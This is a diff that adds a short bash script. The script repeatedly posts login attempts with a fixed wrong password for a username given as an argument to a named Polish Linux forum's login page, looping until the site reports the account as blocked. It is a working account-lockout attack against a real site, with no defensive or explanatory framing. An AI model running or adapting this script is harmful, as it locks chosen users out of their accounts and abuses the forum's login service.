@@ -1,0 +1,7 @@
+#!/bin/bash
+echo "A" | grep B
+while [ "$?" = "1" ]
+do 
+  echo "lololo"
+  curl -d "username=${1}&password=fasada&stud=8&study=31&obrazek=05&redirect=viewtopic.php%3Fp%3D204876&login=Zaloguj" http://www.lugpol.pl/forum/login.php\?redirect\=viewtopic.php\&p\=204876\&sid\=56bc699cac0c8b618d597bbd92a6c377\#204876 2>&1 | grep zablokowane
+done
